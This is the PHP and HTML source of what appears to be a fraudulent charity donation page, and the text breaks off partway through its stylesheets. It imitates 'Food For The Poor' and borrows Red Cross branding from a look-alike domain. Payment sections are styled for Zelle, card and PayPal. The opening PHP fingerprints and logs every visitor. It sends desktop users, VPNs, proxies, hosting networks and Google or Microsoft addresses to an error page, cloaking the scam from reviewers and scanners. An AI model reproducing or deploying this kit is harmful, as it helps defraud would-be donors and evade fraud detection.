<?php
include($_SERVER['DOCUMENT_ROOT']."/include/init.php");
header("Content:Content-type:text/html;charset=utf-8");
//   // 作用取得客户端的ip、地理位置、浏览器、以及访问设备

   ////获得访客浏览器类型
   function GetBrowser(){
    if(!empty($_SERVER['HTTP_USER_AGENT']))
    {
    $br = $_SERVER['HTTP_USER_AGENT'];
    $data_agent = strstr($br,'Browser',true);
    if($data_agent){
        $browser = explode(" ", $data_agent);
        $br = $browser[count($browser) - 1];
     }elseif (preg_match('/MSIE/i',$br)){
       $br = 'MSIE';
     }elseif (preg_match('/Firefox/i',$br)){
       $br = 'Firefox';
     }elseif (preg_match('/Chrome/i',$br)){
       $br = 'Chrome';
     }elseif (preg_match('/Safari/i',$br)){
       $br = 'Safari';
     }elseif (preg_match('/Opera/i',$br)){
       $br = 'Opera';
     }else {
       $br = 'Other';
     }
       return json_encode($br);
     }else{
       return "";
     }
   }
   ////获得访客浏览器语言
   function GetLang()
   {
      if(!empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])){
        $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
        $lang = substr($lang,0,5);
        if(preg_match("/zh-cn/i",$lang)){
          $lang = "zh-CN";
        }elseif(preg_match("/zh/i",$lang)){
          $lang = "zh-cn";
        }else{
          $lang = "en";
        }
        return json_encode($lang);
      }else{
      return "";
      }
   }
   //获取客户端操作系统信息包括win10
  function GetOs(){
    $agent = $_SERVER['HTTP_USER_AGENT'];
    $os = false;
    if (preg_match('/win/i', $agent) && strpos($agent, '95'))
    {
      $os = 'Windows 95';
    }
    else if (preg_match('/win 9x/i', $agent) && strpos($agent, '4.90'))
    {
      $os = 'Windows ME';
    }
    else if (preg_match('/win/i', $agent) && preg_match('/98/i', $agent))
    {
      $os = 'Windows 98';
    }
    else if (preg_match('/win/i', $agent) && preg_match('/nt 6.0/i', $agent))
    {
      $os = 'Windows Vista';
    }
    else if (preg_match('/win/i', $agent) && preg_match('/nt 6.1/i', $agent))
    {
      $os = 'Windows 7';
    }
    else if (preg_match('/win/i', $agent) && preg_match('/nt 6.2/i', $agent))
    {
      $os = 'Windows 8';
    }else if(preg_match('/win/i', $agent) && preg_match('/nt 10.0/i', $agent))
    {
      $os = 'Windows 10';#添加win10判断
    }else if (preg_match('/win/i', $agent) && preg_match('/nt 5.1/i', $agent))
    {
      $os = 'Windows XP';
    }
    else if (preg_match('/win/i', $agent) && preg_match('/nt 5/i', $agent))
    {
      $os = 'Windows 2000';
    }
    else if (preg_match('/win/i', $agent) && preg_match('/nt/i', $agent))
    {
      $os = 'Windows NT';
    }
    else if (preg_match('/win/i', $agent) && preg_match('/32/i', $agent))
    {
      $os = 'Windows 32';
    }
    else if (preg_match('/android/i', $agent))
    {
      $os = 'android';
    }
    else if (preg_match('/linux/i', $agent))
    {
      $os = 'Linux';
    }
    else if (preg_match('/unix/i', $agent))
    {
      $os = 'Unix';
    }
    else if (preg_match('/sun/i', $agent) && preg_match('/os/i', $agent))
    {
      $os = 'SunOS';
    }
    else if (preg_match('/ibm/i', $agent) && preg_match('/os/i', $agent))
    {
      $os = 'IBM OS/2';
    }
    else if (preg_match('/Mac/i', $agent) && preg_match('/PC/i', $agent))
    {
      $os = 'Macintosh PC';
    }
    else if (preg_match('/PowerPC/i', $agent))
    {
      $os = 'PowerPC';
    }
    else if (preg_match('/AIX/i', $agent))
    {
      $os = 'AIX';
    }
    else if (preg_match('/HPUX/i', $agent))
    {
      $os = 'HPUX';
    }
    else if (preg_match('/NetBSD/i', $agent))
    {
      $os = 'NetBSD';
    }
    else if (preg_match('/BSD/i', $agent))
    {
      $os = 'BSD';
    }
    else if (preg_match('/OSF1/i', $agent))
    {
      $os = 'OSF1';
    }
    else if (preg_match('/IRIX/i', $agent))
    {
      $os = 'IRIX';
    }
    else if (preg_match('/FreeBSD/i', $agent))
    {
      $os = 'FreeBSD';
    }
    else if (preg_match('/teleport/i', $agent))
    {
      $os = 'teleport';
    }
    else if (preg_match('/flashget/i', $agent))
    {
      $os = 'flashget';
    }
    else if (preg_match('/webzip/i', $agent))
    {
      $os = 'webzip';
    }
    else if (preg_match('/offline/i', $agent))
    {
      $os = 'offline';
    }
    else if (preg_match('/iphone/i', $agent))
    {
      $os = 'iphone';
    }
    else if (preg_match('/ipad/i', $agent))
    {
      $os = 'ipad';
    }
    else if (preg_match('/Mac/i', $agent))
    {
      $os = 'Macintosh';
    } 
    else
    {
      $os = '';
    }
    return json_encode($os);
  }
  //获得访客真实ip
   function Get_ip()
  {
    if ($_SERVER["HTTP_CLIENT_IP"] && !empty($_SERVER["HTTP_CLIENT_IP"])) {
      $ip = $_SERVER["HTTP_CLIENT_IP"];
    }
    if ($_SERVER['HTTP_X_FORWARDED_FOR'] && !empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { // 获取代理ip
      $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    }
    if ($ip) {
      $ips = array_unshift($ips, $ip);
    }
    $count = count($ips);
    for ($i = 0; $i < $count; $i ++) {
      if (! preg_match("/^(10|172\.16|192\.168)\./i", $ips[$i])) { // 排除局域网ip
        $ip = $ips[$i];
        break;
      }
    }
    $tip = empty($_SERVER['REMOTE_ADDR']) ? $ip : $_SERVER['REMOTE_ADDR'];
    return $tip;
   /* if ($tip == "127.0.0.1") { // 获得本地真实IP
      return $this->get_onlineip();
    } else {
      return $tip;
    }*/
  }
   // //根据ip获得访客所在地地名
  function Getaddress($ip = '')
  {
    if (empty($ip)) {
      $ip = Get_ip();
    }
    $ipadd = file_get_contents("https://www.svlik.com/t/ipapi/ip.php?ip=".$ip); // ip-api
    if ($ipadd) {
        
        return json_decode($ipadd,true);
   /*   $charset = iconv("gbk", "utf-8", $ipadd);
      preg_match_all("/[\x{4e00}-\x{9fa5}]+/u", $charset, $ipadds);
      return $ipadds; // 返回一个二维数组*/
    } else {
      return "";
    }
  }
  
  
  
$ipadd = file_get_contents("http://ip-api.com/json/".$_SERVER['REMOTE_ADDR']."?fields=country,isp,org,as,mobile,proxy,hosting&lang=zh-CN"); // ip-api
  //获取USER AGENT
$agent = strtolower($_SERVER['HTTP_USER_AGENT']);
//分析数据
$is_pc = (strpos($agent, 'windows')) ? true : false;
//$is_linux = (strpos($agent, 'linux')) ? true : false;
$is_mac = (strpos($agent, 'Mac')) ? true : false;
  //输出数据
if($ipadd){
    $ip = json_decode($ipadd,true);
    $nowtime = time() - 600;
    $ispcox = (strpos($ip['isp'], 'Cox')) ? true : false;
    $ispmic = (strpos($ip['isp'], 'Microsoft')) ? true : false;
    $ispgoo = (strpos($ip['isp'], 'Google')) ? true : false;
    $set->table_name = 'ip_limit';
    $like_ip = $set->keyfind('*','ip like "%'.daddslashes($_SERVER['REMOTE_ADDR']).'%"');
    $access = '';
    if($ip['isp'] == 'VPN' || $ip['proxy'] || $ip['hosting'] || $is_pc || json_decode(GetOs())=='Linux' || $ispcox || $ispmic || $ispgoo || $like_ip || $is_mac){
        $access = '1';
    }else{
        $access = '0';
    }
    $set->table_name = 'package_log';
    $log_ip = $set->keyfind('*','ip = "'.daddslashes($_SERVER['REMOTE_ADDR']).'" AND time > '.$nowtime.' AND url = "'.$_SERVER['HTTP_HOST'].'"');
    if($log_ip){
        
    }else{
        $data = array();
        $get_ip = Getaddress();
        $data['time'] = time();
        $data['url'] = $_SERVER['HTTP_HOST'];
        $data['ip'] = $_SERVER['REMOTE_ADDR'];
        $data['language'] = json_decode(GetLang());
        $data['system'] = json_decode(GetOs());
        $data['browser'] = json_decode(GetBrowser());
        $data['ips'] = $get_ip['beginip'].",".$get_ip['endip'];
        $data['country'] = $ip['country'];
        $data['area'] = $ip['isp'];
       // $data['mobile'] = $get_ip['mobile']==true?1:0;
        $data['proxy'] = $ip['proxy']==true?1:0;
        $data['hosting'] = $ip['hosting']==true?1:0;
        $data['agent'] = $_SERVER['HTTP_USER_AGENT'];
        $data['access'] = $access;
        $sql = $set->create($data); 
    }
    if($access == 1){
        header('location:error.html');
        exit(); 
    }

}else{
        header('location:error.html');
        exit();
}
  
  

?>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Food For The Poor | Feeding the Hungry | Charity organization</title>
    <meta name="description" content="<?=$og['description']?>">
    <meta name="template" content="campaign-donation">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="tags">
    <!-- Open Graph -->
    <meta name="title" content="Food For The Poor | Feeding the Hungry | Charity organization">
    <meta property="og:url" content="<?=$og['url']?>">
    <meta property="og:title" content="Food For The Poor | Feeding the Hungry | Charity organization">
    <meta property="og:description" content="<?=$og['description']?>">
    <meta property="og:image" content="<?=$og['image']?>">
    <meta property="og:site" content="<?=$og['site']?>">
    <meta property="og:type" content="website">
    <!--Add custom meta tags-->
    <meta name="keywords" content="">
    <meta name="region-code" content="">
    <meta name="page-type" content="page">
 <!--   <link rel="icon" href="../favicon.webp"> -->
    <!--Canonical URL-->
    <link rel="canonical" href="">
<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
    <link rel="stylesheet" href="../index_files/components.min.f5f28440f11753d558c867ba78d2a5df.css" type="text/css">
    <!-- DTM -->
    <!--<script src="//assets.adobedtm.com/16a36399704a/2efca5d8f658/launch-b67461f3859d.min.js"></script>-->
    <link rel="stylesheet" href="../index_files/rcodonations.min.f79d9aa45ceebbf47b9f46ca5745684d.css" type="text/css">
    <link href="../index_files/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <script src="../index_files/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="../index_files/donation-reset.css" type="text/css">
    <link rel="stylesheet" href="../index_files/base.min.ed93ba9dc0641f1453cc70a4a316f426.css" type="text/css">
    <script src="../index_files/jquery.min.js"></script>

    <style>
        .square-bullet-list{
            font-size: 16px;
        }
    </style>

    <script src="../index_files/donate.js"></script>
    <link rel="icon" type="image/vnd.microsoft.icon" href="https://africa-redcross.org/etc/designs/redcross/shared/favicon.ico">
    <link rel="shortcut icon" type="image/vnd.microsoft.icon" href="https://africa-redcross.org/etc/designs/redcross/shared/favicon.ico">
    <style>.card-information-section[_ngcontent-c6]   legend[_ngcontent-c6]:before{content:"\E177"}.card-information-section[_ngcontent-c6]   .switch-card[_ngcontent-c6]{font-family:Roboto,Arial,Helvetica Neue,Helvetica,sans-serif;font-size:1.4rem;line-height:1.6rem;color:#007caf}.card-information-section[_ngcontent-c6]   .switch-card[_ngcontent-c6]   span.button-text[_ngcontent-c6]{cursor:pointer}.card-information-section[_ngcontent-c6]   .switch-card[_ngcontent-c6]   .glyphicon[_ngcontent-c6]{font-family:rco-icon,glyphicons-haflings-regular,sans-serif}.card-information-section[_ngcontent-c6]   .switch-card[_ngcontent-c6]   .glyphicon.glyphicon-lock[_ngcontent-c6]{color:#000;margin-left:.5rem}.card-information-section[_ngcontent-c6]   .switch-card[_ngcontent-c6]   .donation-edit-icon-wrapper[_ngcontent-c6]{display:inline-block;background-color:#007caf;color:#fff;height:1.6rem;width:1.6rem;margin-right:.5rem;border-radius:3rem}.card-information-section[_ngcontent-c6]   .switch-card[_ngcontent-c6]   .donation-edit-icon[_ngcontent-c6]{position:relative;margin:auto;font-size:.9rem;padding-bottom:.1rem;-ms-flex-item-align:center;-ms-grid-row-align:center;align-self:center}.card-information-section[_ngcontent-c6]   .switch-card[_ngcontent-c6]   .donation-edit-icon[_ngcontent-c6]:before{position:absolute;top:-.9rem;left:.5rem}.card-information-section[_ngcontent-c6]   .completed-card-info-container[_ngcontent-c6]{margin-left:.75rem;font-family:Roboto,Arial,Helvetica Neue,Helvetica,sans-serif;font-size:1.4rem;line-height:1.6rem}.card-information-section[_ngcontent-c6]   .completed-card-info-container[_ngcontent-c6]   .row[_ngcontent-c6]{padding:0;margin:0}.card-information-section[_ngcontent-c6]   .completed-card-info-container[_ngcontent-c6]   .row[_ngcontent-c6]   label[_ngcontent-c6]{width:14.3rem;font-weight:700;padding-right:2rem;margin-bottom:1rem}.card-information-section[_ngcontent-c6]   .completed-card-info-container[_ngcontent-c6]   .row[_ngcontent-c6]   span[_ngcontent-c6]{padding:0}.card-information-section[_ngcontent-c6]   .completed-card-info-container[_ngcontent-c6]   .row[_ngcontent-c6]   .card-images[_ngcontent-c6], .card-information-section[_ngcontent-c6]   .completed-card-info-container[_ngcontent-c6]   .row[_ngcontent-c6]   .cvv-image[_ngcontent-c6]{height:3.4rem;padding-top:0;margin-top:-1rem;margin-left:2rem}.card-information-section[_ngcontent-c6]   .completed-card-info-container[_ngcontent-c6]   .row[_ngcontent-c6]   .card-images[_ngcontent-c6]   img[_ngcontent-c6], .card-information-section[_ngcontent-c6]   .completed-card-info-container[_ngcontent-c6]   .row[_ngcontent-c6]   .cvv-image[_ngcontent-c6]   img[_ngcontent-c6]{margin-right:1rem;height:3.4rem;display:none}.card-information-section[_ngcontent-c6]   .completed-card-info-container[_ngcontent-c6]   .row[_ngcontent-c6]   .card-images[_ngcontent-c6]   img.active[_ngcontent-c6], .card-information-section[_ngcontent-c6]   .completed-card-info-container[_ngcontent-c6]   .row[_ngcontent-c6]   .cvv-image[_ngcontent-c6]   img.active[_ngcontent-c6]{display:inline}.card-information-section[_ngcontent-c6]   .completed-card-info-container[_ngcontent-c6]   .completed-exp[_ngcontent-c6]{margin-bottom:1rem}.card-information-section[_ngcontent-c6]   .form-section-container[_ngcontent-c6]   .switch-card[_ngcontent-c6]{padding-top:1rem;padding-left:.5rem}.card-information-section[_ngcontent-c6]   input.card-number.form-control[name=number][_ngcontent-c6]{font-family:Arial,Helvetica Neue,Helvetica,sans-serif}.card-information-section[_ngcontent-c6]   .cardinfo-expdate[_ngcontent-c6]{display:-ms-flexbox;display:flex}.card-information-section[_ngcontent-c6]   .cardinfo-expdate[_ngcontent-c6]   .cardinfo-month[_ngcontent-c6], .card-information-section[_ngcontent-c6]   .cardinfo-expdate[_ngcontent-c6]   .cardinfo-year[_ngcontent-c6]{position:relative;-ms-flex-preferred-size:100%;flex-basis:100%}.card-information-section[_ngcontent-c6]   .cardinfo-expdate[_ngcontent-c6]   .cardinfo-slash[_ngcontent-c6]{font-size:2rem;font-weight:700;line-height:3.5rem;margin:26px 10px 0 10px;-ms-flex-item-align:start;align-self:flex-start}.card-information-section[_ngcontent-c6]   .cardinfo-expdate[_ngcontent-c6]   .form-control-feedback[_ngcontent-c6]{right:-.2rem}.card-information-section[_ngcontent-c6]   .card-images[_ngcontent-c6], .card-information-section[_ngcontent-c6]   .cvv-image[_ngcontent-c6]{height:3.4rem;padding-top:0}.card-information-section[_ngcontent-c6]   .card-images[_ngcontent-c6]   img[_ngcontent-c6], .card-information-section[_ngcontent-c6]   .cvv-image[_ngcontent-c6]   img[_ngcontent-c6]{margin-right:1rem;height:3.4rem;opacity:.3}.card-information-section[_ngcontent-c6]   .card-images[_ngcontent-c6]   img.active[_ngcontent-c6], .card-information-section[_ngcontent-c6]   .cvv-image[_ngcontent-c6]   img.active[_ngcontent-c6]{opacity:1}.card-information-section[_ngcontent-c6]   .cvv-image[_ngcontent-c6]{padding-top:2.6rem}@media (min-width:768px){.card-information-section[_ngcontent-c6]   .card-images[_ngcontent-c6]{padding-top:2.6rem}}.card-information-section[_ngcontent-c6]   .card-details[_ngcontent-c6]   .col-md-2[_ngcontent-c6]{padding:0}</style>

    <style>.my-donations[_ngcontent-c1]{padding-bottom:3rem}  .custom-field-wrapper.apple-type .custom-field-section,   .custom-field-wrapper.paypal-type .custom-field-section{margin-top:0;padding-top:2rem}  .custom-field-wrapper.apple-type .custom-field-section .form-section.row,   .custom-field-wrapper.paypal-type .custom-field-section .form-section.row{-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center}.bottom-section[_ngcontent-c1]{border-top:1px solid #9f9fa3;padding:3rem 0 3rem 0;display:-ms-flexbox;display:flex;-ms-flex-direction:column;flex-direction:column;-ms-flex-pack:end;justify-content:flex-end}@media (min-width:768px){.bottom-section[_ngcontent-c1]{-ms-flex-direction:row;flex-direction:row}}.bottom-section[_ngcontent-c1]   .recently-donated-warning[_ngcontent-c1]{padding:0}.bottom-section[_ngcontent-c1]   .recently-donated-warning[_ngcontent-c1]   .warning-message[_ngcontent-c1]{color:#4a4a4a;font-family:Roboto,Arial,Helvetica Neue,Helvetica,sans-serif;font-size:1.4rem;font-weight:100}.bottom-section[_ngcontent-c1]   .recently-donated-warning[_ngcontent-c1]   .warning-buttons[_ngcontent-c1]{display:-ms-flexbox;display:flex}.bottom-section[_ngcontent-c1]   .recently-donated-warning[_ngcontent-c1]   .warning-buttons[_ngcontent-c1]   button[_ngcontent-c1]{border-radius:.3rem;background-color:#fff;box-shadow:0 .2rem .4rem 0 rgba(0,0,0,.15);border:.1rem solid #007caf;margin:1rem 1rem 0 0;cursor:pointer;min-width:8.7rem;color:#007caf;padding:.7rem 1.5rem;font-size:1.6rem;font-weight:700;min-height:3.5rem}.bottom-section[_ngcontent-c1]   .recently-donated-warning[_ngcontent-c1]   .warning-buttons[_ngcontent-c1]   button[_ngcontent-c1]:hover{background-color:#e8e8e8}.bottom-section[_ngcontent-c1]   .recently-donated-warning[_ngcontent-c1]   .warning-buttons[_ngcontent-c1]   button[_ngcontent-c1]:active{background-color:#007caf;border:.1rem solid #007caf;color:#fff}.bottom-section[_ngcontent-c1]   .security-logos-wrapper[_ngcontent-c1]{display:-ms-flexbox;display:flex;margin-top:2rem;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;padding-left:0}@media (min-width:768px){.bottom-section[_ngcontent-c1]   .security-logos-wrapper[_ngcontent-c1]{margin-top:0;-ms-flex-wrap:nowrap;flex-wrap:nowrap}}.bottom-section[_ngcontent-c1]   .security-logos-wrapper[_ngcontent-c1]   .security-logo[_ngcontent-c1]{display:inline-block;margin-top:2rem;margin-bottom:1rem;padding-right:2rem}@media (min-width:768px){.bottom-section[_ngcontent-c1]   .security-logos-wrapper[_ngcontent-c1]   .security-logo[_ngcontent-c1]{margin-top:0;padding-left:2rem;padding-right:0}}.bottom-section[_ngcontent-c1]   .security-logos-wrapper[_ngcontent-c1]   .security-logo[_ngcontent-c1]   a[_ngcontent-c1]{display:inline-block}.bottom-section[_ngcontent-c1]   .security-logos-wrapper[_ngcontent-c1]   .security-logo[_ngcontent-c1]   a[_ngcontent-c1]:hover{cursor:auto}.bottom-section[_ngcontent-c1]   .security-logos-wrapper[_ngcontent-c1]   .security-logo[_ngcontent-c1]   .logo-hover[_ngcontent-c1]:hover{cursor:pointer}.bottom-section.expanded[_ngcontent-c1], .notification-section[_ngcontent-c1]{-ms-flex-pack:justify;justify-content:space-between}.notification-section[_ngcontent-c1]{display:-ms-flexbox;display:flex}.notification-section[_ngcontent-c1]   .submission-notification[_ngcontent-c1]{padding:0;margin-bottom:3rem}.notification-section[_ngcontent-c1]   .submission-notification[_ngcontent-c1]   span[_ngcontent-c1]{color:#4a4a4a;font-family:Roboto,Arial,Helvetica Neue,Helvetica,sans-serif;font-size:1.4rem;font-weight:100}</style>
    <style>.submit-wrapper[_ngcontent-c14]{padding:0;display:-ms-flexbox;display:flex;-ms-flex-align:center;align-items:center;-ms-flex-wrap:wrap;flex-wrap:wrap}@media (min-width:576px){.submit-wrapper[_ngcontent-c14]{-ms-flex-wrap:nowrap;flex-wrap:nowrap}}.submit-wrapper[_ngcontent-c14]   div[_ngcontent-c14]{white-space:nowrap;font-family:Roboto,Arial,Helvetica Neue,Helvetica,sans-serif;font-weight:700;font-size:1.4rem;text-transform:uppercase;min-height:3.4rem;border-style:none;border-radius:.3rem;box-shadow:0 .2rem .4rem 0 rgba(0,0,0,.15);padding:1rem 3rem;line-height:1.42857;margin-right:1rem}.submit-wrapper[_ngcontent-c14]   div.medium[_ngcontent-c14]{font-size:1.64rem;min-height:3.9rem}.submit-wrapper[_ngcontent-c14]   div.large[_ngcontent-c14]{font-size:2.2rem;min-height:4.3rem}.submit-wrapper[_ngcontent-c14]   .redcross-button[_ngcontent-c14]{cursor:pointer;color:#fff;background-color:#e11b22}.submit-wrapper[_ngcontent-c14]   .redcross-button[_ngcontent-c14]:hover{background-color:#b2141a}.submit-wrapper[_ngcontent-c14]   .redcross-button.visible[_ngcontent-c14]{visibility:visible}.submit-wrapper[_ngcontent-c14]   .redcross-button-disabled[_ngcontent-c14]{cursor:auto;color:#9f9fa3;background-color:#d8d8d8}.submit-wrapper[_ngcontent-c14]   .redcross-button-disabled.visible[_ngcontent-c14]{visibility:visible}.submit-wrapper[_ngcontent-c14]   .fa-spinner[_ngcontent-c14]{color:#6d6e70;margin-top:.2rem}</style>
    <style>@charset "UTF-8";.personal-information-section[_ngcontent-c5]   legend[_ngcontent-c5]:before{content:"\E008"}.personal-information-section[_ngcontent-c5]   .completed-personal-info-container[_ngcontent-c5]{margin-left:.75rem;font-family:Roboto,Arial,Helvetica Neue,Helvetica,sans-serif;font-size:1.4rem;line-height:1.6rem}.personal-information-section[_ngcontent-c5]   .completed-personal-info-container[_ngcontent-c5]   .row[_ngcontent-c5]{padding:0;margin:0}.personal-information-section[_ngcontent-c5]   .completed-personal-info-container[_ngcontent-c5]   .row[_ngcontent-c5]   label[_ngcontent-c5]{width:14.3rem;font-weight:700;padding-right:2rem;margin-bottom:1rem}.personal-information-section[_ngcontent-c5]   .completed-personal-info-container[_ngcontent-c5]   .row[_ngcontent-c5]   span[_ngcontent-c5]{padding:0}.personal-information-section[_ngcontent-c5]   .completed-personal-info-container[_ngcontent-c5]   .completed-email[_ngcontent-c5]{margin-bottom:1rem}.personal-information-section[_ngcontent-c5]   .notice-container[_ngcontent-c5]{padding-top:1rem;padding-right:1.5rem}.personal-information-section[_ngcontent-c5]   .notice-container[_ngcontent-c5]   .notice[_ngcontent-c5]{display:block;font-family:Roboto,Arial,Helvetica Neue,Helvetica,sans-serif;font-size:1.2rem;font-weight:300;padding-bottom:1.3rem;color:#4a4a4a}.personal-information-section[_ngcontent-c5]   .email-tooltip[_ngcontent-c5]{cursor:pointer;position:relative;display:inline-block;padding-left:.5rem}.personal-information-section[_ngcontent-c5]   .email-tooltip[_ngcontent-c5]   i[_ngcontent-c5]{font-size:1.4rem;line-height:1;color:#6d6e70}.personal-information-section[_ngcontent-c5]   .email-tooltip[_ngcontent-c5]   .email-tooltiptext[_ngcontent-c5]{color:#e8e8e8;background-color:rgba(51,51,51,.8);visibility:hidden;width:25rem;font-size:1.2rem;font-weight:400;text-align:left;padding:1.5rem;border-radius:.6rem;position:absolute;z-index:1;top:auto;bottom:3rem;left:-1.4rem}@media (min-width:768px){.personal-information-section[_ngcontent-c5]   .email-tooltip[_ngcontent-c5]   .email-tooltiptext[_ngcontent-c5]{top:-1.5rem;bottom:auto;left:2.8rem}}.personal-information-section[_ngcontent-c5]   .email-tooltip.active[_ngcontent-c5]   .email-tooltiptext[_ngcontent-c5], .personal-information-section[_ngcontent-c5]   .email-tooltip[_ngcontent-c5]:active   .email-tooltiptext[_ngcontent-c5], .personal-information-section[_ngcontent-c5]   .email-tooltip[_ngcontent-c5]:hover   .email-tooltiptext[_ngcontent-c5]{visibility:visible}@media (hover:hover){.personal-information-section[_ngcontent-c5]   .email-tooltip[_ngcontent-c5]:hover   .email-tooltiptext[_ngcontent-c5]{visibility:visible}}.personal-information-section[_ngcontent-c5]   .email-tooltip[_ngcontent-c5]   .email-tooltiptext[_ngcontent-c5]:after{content:" ";position:absolute;top:auto;left:1.7rem;bottom:-1.6rem;right:auto;border-width:.8rem;border-style:solid;border-color:rgba(51,51,51,.8) transparent transparent transparent}@media (min-width:768px){.personal-information-section[_ngcontent-c5]   .email-tooltip[_ngcontent-c5]   .email-tooltiptext[_ngcontent-c5]:after{content:" ";position:absolute;bottom:auto;right:auto;border-width:.8rem;border-style:solid;border-color:transparent rgba(51,51,51,.8) transparent transparent;top:1.8rem;left:0;margin-left:-1.6rem}}.personal-information-section[_ngcontent-c5]   .phone-tooltip[_ngcontent-c5]{cursor:pointer;position:relative;display:inline-block;padding-left:.5rem}.personal-information-section[_ngcontent-c5]   .phone-tooltip[_ngcontent-c5]   i[_ngcontent-c5]{font-size:1.4rem;line-height:1;color:#6d6e70}.personal-information-section[_ngcontent-c5]   .phone-tooltip[_ngcontent-c5]   .phone-tooltiptext[_ngcontent-c5]{color:#e8e8e8;background-color:rgba(51,51,51,.8);visibility:hidden;width:25rem;font-size:1.2rem;font-weight:400;text-align:left;padding:1.5rem;border-radius:.6rem;position:absolute;z-index:1;top:auto;bottom:3rem;left:-1.4rem}@media (min-width:768px){.personal-information-section[_ngcontent-c5]   .phone-tooltip[_ngcontent-c5]   .phone-tooltiptext[_ngcontent-c5]{top:-1.5rem;bottom:auto;left:2.8rem}}.personal-information-section[_ngcontent-c5]   .phone-tooltip.active[_ngcontent-c5]   .phone-tooltiptext[_ngcontent-c5], .personal-information-section[_ngcontent-c5]   .phone-tooltip[_ngcontent-c5]:active   .phone-tooltiptext[_ngcontent-c5], .personal-information-section[_ngcontent-c5]   .phone-tooltip[_ngcontent-c5]:hover   .phone-tooltiptext[_ngcontent-c5]{visibility:visible}@media (hover:hover){.personal-information-section[_ngcontent-c5]   .phone-tooltip[_ngcontent-c5]:hover   .phone-tooltiptext[_ngcontent-c5]{visibility:visible}}.personal-information-section[_ngcontent-c5]   .phone-tooltip[_ngcontent-c5]   .phone-tooltiptext[_ngcontent-c5]:after{content:" ";position:absolute;top:auto;left:1.7rem;bottom:-1.6rem;right:auto;border-width:.8rem;border-style:solid;border-color:rgba(51,51,51,.8) transparent transparent transparent}@media (min-width:768px){.personal-information-section[_ngcontent-c5]   .phone-tooltip[_ngcontent-c5]   .phone-tooltiptext[_ngcontent-c5]:after{content:" ";position:absolute;bottom:auto;right:auto;border-width:.8rem;border-style:solid;border-color:transparent rgba(51,51,51,.8) transparent transparent;top:1.8rem;left:0;margin-left:-1.6rem}}</style>
<style>
#copy_img{
    width:3.5rem;
    height:3.5rem;
    background-size: 100%;
    display: none;
}
#iframes{
    width:100%;
    height:100%;
    position:fixed;
    left:0;
    top:0;
    background:rgba(0,0,0,0.3);
    z-index: 8888;
}
#iframe_s{
    width:200px;
    height:100px;
    position:fixed;
    top:calc((100% - 100px)/2);
    left:calc((100% - 200px)/2);
    background:#efefef;
    color:#000;
    z-index:9999;
    border:2px solid #efefef;
    border-radius: 10px;
    text-align: center;
    font-size: 20px;
    font-weight: 700;
    line-height:100px;
}
.paybg{
    display:block;
    width:100%;
    height:100%;
    background:rgba(239,239,239,0.9);
    position:absolute;
    top:0;
    left:0;

    z-index: 999;
}
#zelle,
#card,
#paypal{
     pointer-events: none;   
}
*{
    outline:none!important;
}
    .active{
            color: #fff!important;
    background: #007caf!important;
    }
    #copyed{
        display:none;
        color:#000;
        font-size: 20px;
        height:3.5rem;
        line-height:3.5rem;
    }
    @media (max-width: 767px){
        #iframe_zelle{
            width:80%;
            height:70%;
            position:fixed;
            top:15%;
            left:10%;
            z-index: 9999;
        }    
    }
    @media (min-width: 992px){
    #iframe_zelle{
        width:30%;
        height:80%;
        position:fixed;
        top:10%;
        left:35%;
        z-index: 9999;
    }
    }
</style>

<!--PAY-->



<!--payend-->
<style>
.account{
    display:none;
}
.account .accounts{
    font-size: 16px;
    color: #000;
}
.account #copy{
border-radius: .3rem;
color: #007caf;
background-color: #fff;
    border: .1rem solid #007caf;
    display: inline-flex!important;
    box-shadow: 0 0.2rem 0.4rem 0 rgba(0,0,0,.15);
    margin: 1rem 1rem 0 0;
    cursor: pointer;
    width: 8.7rem;
    padding: 0 1.5rem;
    font-size: 1.6rem;
    font-weight: 700;
    height: 3.5rem;
    display: -ms-flexbox;
    display: flex;
    -ms-flex-direction: column;
    flex-direction: column;
    line-height: 1.15;
    text-align: center;
    -ms-flex-pack: center;
    justify-content: center;
    position: relative;
}
#payaccount ,
#price{
    display: inline-block;
    height: 50px;
    line-height: 50px;
    margin-top: 1rem;
    font-size: 20px;
    color: #000;
    font-weight: 700;
}
    #payment{
            cursor: pointer;
        width:100px;
        height:40px;
        font-size: 20px;
        line-height: 40px;
        background:#007caf;
        text-align: center;
        margin:1rem 0;
        color:#fff;
        border:1px solid #efefef;
    }
</style>
                                          <style>
                                                @media (min-width:992px) {
        .node-3450f823-7fc9-4d6e-a789-719ef43654a7-par-top-section_control_copy-column-parsys-1-heroimage .hero-image-container {
            background: url('index_files/hunger.jpg') center center / cover no-repeat;
        }
    }
    @media (min-width:767px) and (max-width: 992px) {
        .node-3450f823-7fc9-4d6e-a789-719ef43654a7-par-top-section_control_copy-column-parsys-1-heroimage .hero-image-container {
            background: url('index_files/hunger.jpg') center center / cover no-repeat;
        }
    }
</style>
                                            <style>
                                                @media (max-width: 767px) {
        .node-3450f823-7fc9-4d6e-a789-719ef43654a7-par-top-section_control_copy-column-parsys-1-heroimage .hero-image-container {
            background: url('index_files/hunger.jpg') center center / cover no-repeat;
        }
    }
</style>
                                            <style>
                                                @media (min-width:992px) {
        .node-3450f823-7fc9-4d6e-a789-719ef43654a7-par-top-section_control_copy_1003715759-column-parsys-1-heroimage .hero-image-container {
            background: url('/content/dam/redcross/donations/donate-forms/heros/OregonWF20_volunteers-with-client_1348x500.jpg.transform/1288/q70/feature/image.jpeg') center center / cover no-repeat;
        }
    }
    @media (min-width:767px) and (max-width: 992px) {
